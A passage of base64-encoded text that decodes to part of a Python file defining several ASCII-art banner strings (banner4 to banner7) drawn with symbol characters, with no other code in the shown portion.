AgKioqKioqKioqKioqKiMqKioqKioqKioqKioqKkAgICAgICAgICAgKioqKioqLyAgICAgIAogICAgIC4uLiouICAgICAoKioqQCAgIEBAICAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqLyAgICAgICAgQCoqKiooICAgICAgIAogICAgICAgICouLiAgJSoqKioqKioqKioqKioqKi8qKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqIyAgICAgICoqKiomICAgICAgIAogICAgICAgLi4uLi5AKioqKioqKioqKioqKioqKipAKioqKioqKioqKioqKkAqKioqKioqKioqKioqKioqKioqKipAKioqKiogICAgICAgIAogICAgICAgICAgICAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKi8qKioqKioqKioqKioqKioqKioqKioqKioqKiogICAgICAgIAogICAgICAgICAgIEAqKioqKioqKioqKioqKioqKkAqKioqKioqKioqKioqKkAqKioqKioqKioqKioqKioqKioqKioqKkAqKiosICAgICAgIAogICAgICAgICAgICAqKioqKioqKiovLyoqKioqKioqKioqKioqKioqKioqKCoqKioqKioqKioqKioqKioqKiMsICAgLyoqKipAICAgICAgIAogICAgICAgICAgICAgQCoqKioqKioqKioqKioqKioqKioqKioqKioqKipAKioqKioqKioqKioqKioqKi8gICAgICAgKCoqKioqICAgICAgIAogICAgICAgICAgICAgICAsKioqKioqKioqKioqKioqKioqKioqKioqKCoqKioqKioqKioqKioqKkAgICAgICAgICAgKioqKioqLyAgICAgIAogICAgICAgICAgICAgICAgICAgQCUqKioqKioqKioqKioqKioqKiUqKkAqKioqKioqKioqKkAgICAgICAgICAgICAjKioqKioqKkAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgIEBAKCoqKiovQCoqKioqKioqKioqKioqQCAgICAgICAgICAgICAgICBAKioqKioqKiogICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQCoqLygqKioqKioqKi8gICAgICAgICAgICAgICAgICAgKioqKioqKiomICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJioqKkAqKioqKioqKioqICAgICAgICAgICAgICAgICAgICoqKioqKiovICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICUqKkAqKioqKioqKioqKiAgICAgICAgICAgICAgICAgICAgQCoqKioqLyAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLyooKioqKioqKioqKkAgICAgICAgICAgICAgICAgICAgICAgICBAKiomIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICoqKioqKioqKkAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLCgqKioqIyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAoKIiIiCmJhbm5lcjQ9ZiIiIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAsQEBAQEAjLyhAQCAgICAgICAgICAgICAgICAgIAogICAgQEBALiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEBAQCYlQEBAIygjQEAgICAgICAgICAgICAgICAgIAogICAgICBAICZAICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQCwvLCwsLCwqKkAsQCZAICAgICAgICAgICAgICAgIAogICAgICAgQCAgL0AgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBALiYvLCwsLCwmKiYuLCxAICAgICAgICAgICAgICAgIAogICAgICAgICYqQCAsQCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICMsQCYqJixAKi8sJiwgLCwjLC9AQCAgICAgICAgICAgICAgIAogICAgICAgICBAICAgIEBAICAgICAgICAgICAgICAgICAgICAgICAgICAgIEAsKiYvKiwuQCwsQCAmLCYvKiUqKiogICAgICAgICAgICAgIAogICAgICAgICAgICwgICBAICYgICAgICAgICAgICAgICAgICAgICAgICAgICAgQC4sKiouLCwsJiwsLiYqLEAqQCAgICAgICAgICAgICAgIAogICAgICAgICAgICBAICAgJiAgJSAgICAgICAgICAgICAgICAgICAgICAgICAgICUuLiwuLiwqLC4sLiwsLyMgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgLCAgICAlICMlICAgICAgICAgICAgICAgICAgICAgICAgICAgQC4sLC4sKiwuKkAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICBAICAgICUgQEAgICAgICAgICAgICAgICAgICAgICAgICAgICAvQC8oQCpAICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgLC4gICAgI0BAQCAgICAgICAgICAgICAgICAgICAgICAgICAgIEAoKioqKCgoQEAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICBAICAgICAvKCNAICAgICAgICAgICAgICAgICAgICAgIEAvKChALiwmKCUoKCgoKCAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICYgICAgJiMqJUAsLkAgICAgICAgICAgICAgICAgQCgjIyMsIyhALygoKCgoKEAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgJiAgIEAsLComQCwuQCAgICAgICAgKkBAQC8vLy8vKCUvLy8vKCgoKCgoKCYgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICBAICBALCxAJiUsLC4sLCojLiwsLCUqQC8vJS8vLy8vLy8vKCgjKCgoKCggICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICYgKCZAQChAQEBAIyovQCwsLCxAKi8lLy8vLy8vLy8vLy9AIygoKCgjICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgIEAqICUmQCAgICwvQC4sLCxAKigqLyUvLy8vLy8vLy8jLi4uLCwsLEAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAlICYlQC4gICAmLi4sLiojJioqJS8qKi8vQCovLyglQEAuLCwsLEAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICBAL0AvJSYlJSUgICAgICAgICAqKkBAKiovKi8vKi8vLy8vQCoqKi9ALCUgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgIEAmKi4sKi9AKkAgICAgICAgICAoQEAsKC9AQEBAQEBAQEBAQCwsLEAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICwmL0AoL0AmJkAgICAgICAgICAgQCgjJSUlJSYmJiYmJiYmQCwsLEAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICgvQCAgICAmJkAgICAgICAgICAgQCgjIyUlJSYmJiYmJiYjLiwsLiYgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICMlJkAgICAgICAgICAgIEAjIyYlJSYmJiYmJkAvLCwsLC4oLCAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEAlJUAgICAgICAgICAgIEAjIyUlJSYmJiYmJUAmLi4uQEAjQCAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICYqQCwgICAgICAgICAgICAgJSooJSMjIyMjIyMjIyMjIyMjIyMjIyZAICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgKkAjIyMjI0AjIyMjIyMjIyMjIyMjIyMjQCAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQC8jIyMjIyMlIyMjIyMlIyMmIyMjIyMjQCAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgKiolIyMjIyMlIyMjIyMjIyMjIyMjIyMjQCAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEAqKiwqKEBAQCYlIy8qLC4uICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjICYuLi5AICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBALiUuLiogICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgL0AmIygoLygoKCMoQChALkAuLkAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQChAJSMjIyMjJSUjJSUlJkAoQEAvQCUlJiYjIyMjQEAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAuLCwsLCwsLCwsLCwsLCwsLCwjJiYmJi8sLCwsLCwsLCwsQCxAIyUjJSUlIyMjIyNAICAgICAgICAgIAogICAgICAgICAgICAgIC4sLCwsLCwsLCwsLC4uICAgLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwuQCYsLCwsLCoqKiomKCAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uICAgICAgIAogICAgICAgIAoiIiIKYmFubmVyNT1mIiIiCiAgICAgICAgICAgICAgKCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgKCYgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgIEAgICAgKCYgICAgICAgICAgICAgICAgICAgICAgKCwgQCAgICAgICAgICAmIEAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgQCAgICAgKCYgICAgICAgICAgICAgICAgICAgICAgIEAuIyguICAgICAgICMvKiUuICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgKEAmLCAgICAgICAgICAgICAgICAgICAgLC4uLi4uLi4uLi4uLi4uLEAsICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICBAICAgICAgKEAgICAgICAgICAgICAgICAgICAgIEAmIEBALC4qJi4uLi4uLiZAQCAmQCAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgKEAgICAgICAgICAgICAgICAgIEAvKCVAJiwsKiwqKipAJi4sLC4lQEBAJigvQCAgICAgICAgICAgICAgICAgICAgCiAgIEAgICYuICUgICAgKEAgICAgICAgICAgICAgICAgICAgIEBAJSwmLiAgICAlICAgIC4mLy5AQCAgICAgICAgICAgICAgICAgICAgICAgCiAgQC4gICBAIC5AICAgKEAmQCAgICAgICAgICAgICAgIEAsQC4uLixAICAgQCwuLihAQCMsLi4uLiUqQCAgICAgICAgICAgICAgICAgICAgCiAlQCwuIC4gIC4mICAgKEAgICAgICAgICAgICAgICAgICUuLi4uLi4uJiwsICAgICAsLEAuLi4uLi4uIyAgICAgICAgICAgICAgICAgICAgCiBAQC8vLy8vLyYsIEAgKEAgICAgICAgICAgICAgICAmLi4uLi4uLi5ALCwsLCwsLCwsLCxALi4uLi4uLi4lICAgICAgICAgICAgICAgICAgCiAgLCgoKCgoKCMgICAgKEAgICAgICAgICAgICAgIy4uLi4uLi4uLi4uKCosLCwsLCwqLCouLi4uLi4uLi4uLkAgICAgICAgICAgICAgICAgCiAgICAsJSgoKCAgICAuKEAgICAgICAgICAgICAvLi4uLi4uLi4uLi4uLi4uL0BAQCguLi4uLi4uLi4uLi4uLi4jICAgICAgICAgICAgICAgCiAgICBAQEBAQCAgICAuKEAqJiAgICAgICAgICBALC4uLi4uLi4sQCwuLi4uLi4uLi4uLi4uLkAuLi4uLi4uLixAICAgICAgICAgICAgICAgCiAgICAgICAgICAgIC4uKC4vLkAgICAgICAgICAjLyosLi5ALi4uLi4uLi4uLi4uLi4uLi4uLi4uLC5ALC4sLCooKiAjQEAsICAgICAgICAgCiAgICAgICAgICAgQC4uLkAuLiYoKCgoKCgoKCgoLkAsLCwsLCwuLi4uLi4uLiwuLi4uLi4uLi4uLCwsLCwsQC4oKCgoKCgoKChAICAgICAgCiAgICAgICAgICAgIC8uKkAuICAgICAgICAlKChALi4uLCUlKiwsKiwsLCwsLCwsLCwqKioqKiwsLCwjJiwuICAsKChAICAgJUAuLC4uLkAuCiAgICAgICAgICMlLy4uIyxAICAgICAgIC4oQC4gICAgLi4uLiAsLEAjIyMjIyMjIyMjIyMjQCosIC4uLiAgICAgICYoQCAgIC8uLioqJigjCiAgICAgICAgQEBAKipALkAuICAgICAgICUgICAuICAgICAgICAgIC4gLiBAKCgoKCglKCAuICAgICAgICAgIC4gLiAgICAgIEAuQCAgICAgCiAgICAgICAgQEBALiYsLkAoICAgICAgIy4uIC4mIyouLi4uLi4uIC4qICAgLi4lIC4gLiAgIC4uLi4uLiAuLCMmQC4sLEAgICAgICAgICAgCiAgICAgICAgIEBAQCxAQEAoICAgICAgJi4uLiwuIComQEAmKi4uIC4gICAgICAlICAgICAgICAuICwjQEAmLy4uQCwuLi4gICAgICAgICAgCiAgICAgICAgICAgICxAQEAoICAgICAgLi4uLiYuLi4uLC4gLi4gIEAuICAgICAlICAgICAgKCAgICAuLi4uLi4uJiwuLiwmICAgICAgICAgCiAgICAgICAgICAgICxAQEAoICAgICBALi4uLi4uLC5ALC4uKEAoLi4uLiAgLiAlIC4gIC4uLiwqQCUsLi5ALCwuLi4uLixAICAgICAgICAgCiAgICAgICAgICAgICxAQEAoICAgICBALi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4lLi4uLi4uLi4uLi4uLi4uLi4uLi4uLiwqICAgICAgICAgCiAgICAgICAgICAgICxAQEAoICAgICAgICgoKCgjJkBAKC4uLiwuLiwuLCwsLCxALC4uLiwsLCwsLi4uLi8mQEAjKCMoQCAgICAgICAgICAgCiAgICAgICAgICAgICxAQEAoICAgICAgICAgQC8vLy8vLy8vLy8vLy8oKCgoKCgvKCgoKCgoLy8vLy8vLy8vLy8oL0AgICAgICAgICAgICAgCiAgICAgICAgICAgICxAQEAoICAgICAgICAgICAgQC8vLy8vLy8vLy8vLy8vLy8vKC8vLy8vLy8vLy8vLy8vL0AgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICxAQEAoICAgICAgICAgICAgICAgQC8oQCYoKC8vLy8vLy8vKC8vLy8vLy8oJUAlL0AgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICxAQEAoICAgICAgICAgICAgICAgLCwvLy8vLyUsICAgICAgICAgICAuLC8vLy8vJSwgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICxAQEAoICAgICAgICAgICAgICAsQCogICAgICMgICAgICAgICAgICAgICAgICggKCMgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICwgIC4oICAgICAgICAgICBAICAgICAvICAgICMuLi4uLi4uLi4uLi4gICAgICAgLCAvICAsICAgICAgICAgICAgICAgCgoiIiIKYmFubmVyNj1mIiIiCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQCMjIyMjIyMjIyMoKCUjIyogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgIEAmQCMoKEAoKCNAKCgoKCgoKCgoJiMmICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICMjIyMjIyYoKCgoKCgvKCZAQEBAQEBAQCgoICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICZAIyMjJSgjKCMjIyMjIyMjIyMjIyMjIyMoJiAgICAgICAgICAgICAgICAgICBAICAgICAoICAgCiAgICAgICAgICAgICAgICAgICAgICAgICgjIyMjIyMjQCgjIyMjIyMjIyMjIyNAQCgoIyAgICAgICAgICAgICAgICAgJSAgICAgICAgICggCiAgICAgICAgICAgICAgICAgICAgICwmQEBAKCgoKCUjIyMjIyMjIyMjIyMjIyMlQCgjIyMjIyMjKCYgICAgICAgICAgLCAgICAgICAgLiAgCiAgICAgICAgICAgICAgICAgICYjQCMlQCYuKkAmKCMjIygjIyMjIyMjKCMoKCZALCwsJiYjJSUlI0AgICAgICAgICYuICAgICAgICAjICAgCiAgICAgICAgICAgICAgICAgICBAQCAmJi4sLi4uLkBAQCwsLCwsLCwsLEBAQC4uLi4uJiZAICAgICAgICAgICAgKCMgICAgICBAICAgICAgCiAgICAgICAgICAgICAgICAgJi4sKCwsLiwuLi4uJS5AJSgsLi4uLi4uLChALCwsLi4uQCwuLEAqJiAgICAgICAqJSAgQCwgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICgmQCgsLi4uLi4uQCMjIywsLi4uLi4uLCwjIyMlLiwuIC4qLi4vICAgICAgKCpAICAgICAgICAgICAgICAgCiAgICAjLCwqLCoqKioqKixAICAgICAgIy4uIyMjIyMjIyMjIyMjIyMlIyMjIyMjIyMlLiMgICAgICAgIEAgLyMgICAgICAgICAgICAgICAgCiAgICosLCwqKioqKiosJiYmJi8sQCAgICAlLi4sLEAoIyMjIyUsLCwsKCYlLywsLkAgICAgICAgICAgQCAvLyAgICAgICAgICAgICAgICAgCiAgIyoqKiomLyoqKioqKiwqQCwqKipAICAgICAgLEAuLiwuLi4uLi4uLi4jKEAgICAgICAgICAgICAgICgvKCAgIEAgICAgICAgICAgICAgCiAgQCoqKioqKiwsLCoqLCoqKioqKiMvLyggIC8oKCgoKCgmKi8vLyooKCgoKCgoJiAgICAgICAgICAgQC8vICAgJSMjIyAgICAgICAgICAgCiAgICoqKiosKioqKiosJSosKiomLy8vKC8oIywmKCgoKCgoLCoqKiMjKCgoKCgoJiooICAgICAgIy4uKC9AICAgIEAgICAgICAgICAgICAgCiAgICYqKioqKioqKioqKiosLy8vLy8vLy8lKC8jLyooKiooQCoqJigoJSoqKiUoKCoqKioqLCosLiwjQCwuLCAgICUgJiAgICAgICAgICAgCiAgICAoKioqKioqKiUvLy8vLy8vIy8mLy8vKCgoKCMmJSgoIyosKCgoKCgvLygoKCgsKioqKioqJiovQCwsQCBAICAgICAgICAgICAgICAgCiAgICAgIC8oKCgoLy8vLyYvLygoLy8vKC8vJiglJkBAQEBAJSoqKCgjKCMjIyMjQEAvKi8qKi8qKigvL0AuQCAgICAgICAgICAgICAgICAgCiAgICAgIEAoQCgoKCgvJi8vLy8vLygvLygvKCgoKCgoKCgoQCMjKCgoKCgoKCgoKC8oKCMvLy8vLy8vJSBALCoqJSAgICAgICAgICAgICAgCiAgICAgICAgI0AjKCgoJS8oKC8vLy8vJi8vJSMlKioqLygoJiMjKCgoKioqKigmKioqKCgoQCAgQCgvJi8qKioqLiAgICAgICAgICAgICAgCiAgICAgICAgICAgKCYoKCgoJiUvLy8vLy8qJiNAKipAKCgoKCMjKCgoJioqKiMoKiomKCgoKCAgQC8vQCwqQEAsQCAgICAgICAgICAgICAgCiAgICAgICAgICAgLygmLCgoKC8vLy8vLygoKCgoKCgoKCgoKCMjKCgoKCgoKCgoLyVAJigoKCMgQC8vIyAgICogICAgICAgICAgICAgICAgCiAgICAuLy8vKCMgICAgICAoKC8vLy8vKCgoIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMoKigoKCggQC8vLyAgICAgICAgICAgICAgICAgICAgCiAgICAgJS8vLy8oLy4gICBAKC8vL0AoKCgvIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjKi8oJiMjLy8vLyMgICAgICAgICAgICAgICAgICAgCiAgICAgICAlLy8oLyMvQEAoLy8lKEAlKCgoKCMjIyMjIyMjQCAgICAgIyMjIyMjJSYjIyYmKCglICgoKC8gICAgICAgICAgICAgICAgICAgCiAgICAmLy8vLyNAQC9AKC8oLiAgICgoL0AlJSUlJSUlJiMjICAgICAgQCMoJSUlJSUlJSUlJSUgICAgICAgICAgICAgICAgICAgICAgICAgCiAgIEAvLy8oKC8oQCogICAgICAgIEAmJiUlJSUlJSUlJSYmICAgICAgICYmQCYmJiYmQEAmJiYmQCAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICBAJiYmJiYmJiYmJiYmQCAgICAgICpAJiYmJiYmJiZALyAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiIiIgpiYW5uZXI3PWYiIiIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAlJi8gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJkAgICAgICAgICYgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICYuICAgICAgICAgICAmICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAmIyAgICAgICAgICAgICAmICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICYgICAgICAgICAgICAgIC4lICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgJiAgICAgICAgICAgICAgICYgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAmICAgICAgICAgICAgICAgJiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgIEAgICAgICAgICAgICAgICxAICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICUgICAgICAgICAgICAgJiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgQCAgICAgICAgICAgICYoICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgJSAgICAgICAgICAmLiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAuKCAgICAgICAmJSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAlLCAgICUmLiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICgmJi4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgJiAgICAgJiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgKCAgICAgICAgJiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICwgICAgICAgICAgQC4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAsICAgICAgICAgICAgIEAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgKCZAICAgICAgICAgICAgICYgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICUsJSwqLCUgICAgICAgICAgICgmICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLiAgICAgICAgICAgICAgICAgICAgICAgICAKICAgJiwqLCwsLCUgICAgICAgICAgICAmICAgICAgICAgICAgICAgQCYmJiYlJUAgIEAlJSUlJSUlLyUmQCAgICAgICAgICAgICAgICAgICAKICAgLCwqLCosLCUgICAgICAgICAgICAmQCAgICAgICAgICAgICAgICYmJiYmJiUvJSVAJSUlJSUlJSUjIyYsICAgICAgICAgICAgICAgICAKICAsLCwsLCwoJSYgICAgICAgICAgICAgJi4gICAgICAgICAgICAgICAgLiYmIy4uLiYlJSMoJSUlJSUlKCUmICAgICAgICAgICAgICAgICAKIC8jJiwsLCwqLCYgICAgICAgICAgICAgJSYgICAgICAgICAgICAgICAlLiAuLi4uLi8vLi4uLiYmJiUlJSVAICAgICAgICAgICAgICAgICAKLEAoLCwsKiYmJiUjICAgICAgICAgICAgICZAICAgICAgICAgICAgICAgIEAqLiwuLi4uLi4uLiYmJiYmJSYgICAgICAgICAgICAgICAgICAKICAsLCwsLCwqLC4gJiAgICAgICAgICAgICgmICAgICAgICAgICAgICAgLi4uLi4uLi4uLi4uLi4uLiwmJiAgICAgICAgICAgICAgICAgICAKIC4jLCosLCwsLCwgICAgICAgICAgICAgICBAJi4uJiAgICAgICAgICAgLCwuLC4qLi4uLi4uLi4oJiYsICAgICAgICAgICAgICAgICAgICAKICAsQCouLCwsLC8gICAgICBAICAgICAgJi4vJiYuLiMgICAgICAgICAgIEAuLi4uLi4uLiAuLkAmICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgJiwsKioqLCwsKiwgICAgICAgJS4uLi4uLi4qICAgICAmJiMqKiMlLyZAKCMjIyNAKCguICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgLiUsLCwsKiomICAgICAgKi4uLi4uQCMjIyMoJUAlIyMjJiYlIyMjIyMjIyMjIygjICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAsQC4gICAgICAgQCZAJigjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMvJiAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICYmJiYmKCooIyMjIyMjIyMjIyMjIyMjIyMjIyMoKCYgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgJS8jJiYlIygmJiUoIygoKCMoIygmJiMjIyMjIyMjKCYgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAmKCMjIyYmIyYjIyMjIyMmJSMjIyMjIyMjIyMjIyMjKCYgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICojKiMjIyUmJi8lJiMjIyglIyMjIyMjIyMjIyMjIyMoQCAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAlKiMjJiwuJiYoJSYjIyglIyMjIygoIyMjIyMjIyMoJiAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICBAIyMjLC4uLi4uLi4mIyglIyMjIyMjIyMjIyMjIyMjKCYgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgLEAjJi4uLi4uLi4mIyMlJSMjIyMjIyhAIyMoKCUjLygmICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAmJiZAJkAoIyMmJiMjIyMmIyMjJSgjIyMmIyMvJiUgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEAqIyMoJiZAIyMmJSgjIyMjKCMlJigmIyMjJiMjKiUlICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIygoIyMjKCYmJiMjJUAjIyMoKCgoIygjKCgoKiYjIyomIyAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJiMoKCgoIygmJiYjJiVAIyMjIyNAJiUoKCMjIyMjIyMoJiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLCYmJSUlJSUlJiYmJSUlJiMjIyNAJiUlJSUlJSUlJSYmJiYgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJiUlJSUlJSUlJSUlJSUlJSYlJSUlJSUlJSUlJSUlJSUmICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgIC4mJSUlJSUlJSUlJSUlJSUlJSUlJSMqLyUjIyglJSUlJSUmLCAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgIC4sLCUlJSUlJSUlIyolJSYqLCwsLCwsLCwlQCUoKiUlJSUlJSUlJiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgLiwsLCwsLCwsLCwsQCUlJSUlJSUqJUAvLCwsLCwsLCwuLCwsLCwmJSolJSUlJSUlJiwsLCwsLCwuICAgICAgICAKICAgICAgICAgICwsLCwsLCwsLCwsLCwsLCwuJiUlJSUlJSolQCwsLCwsLCwsLi4sLCwsLCwsJiUjJSUlJSUlQCwsLCwsLCwsLCwsLCwgICAKICAgICAgICwsLCwsLCwsLCYvLCwsLCwsLCwsJSUlJSUlJSVALCwlLCwsLCwsLCwsLCwsLCwsJiUjJSUlJSUmKiwsLCwsLCwsLCwsLCwsLC4KICAgICAgLiwsLCwsLCwsLCYsLCwlLCwsLCwsLyZAJiYmJiYoLCwsKCYsLCwsLCwmLCwsLCwsJiUlJSUlJSUmLCwsLC8sLCwoLCwsLCwsLCwKICAgICAgIC4sLCwsLCwsLCwuLCwsLComLCwsLCwsLCwsLCwuJiYlLiwsLCwsLCwlIywsLCwsLC4uLCwsLC4sLCwsJiwsLCwvQCwsLCwsLCAKICAgICAgICAgIC4sLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwqLC4sLCwsLCwsLCws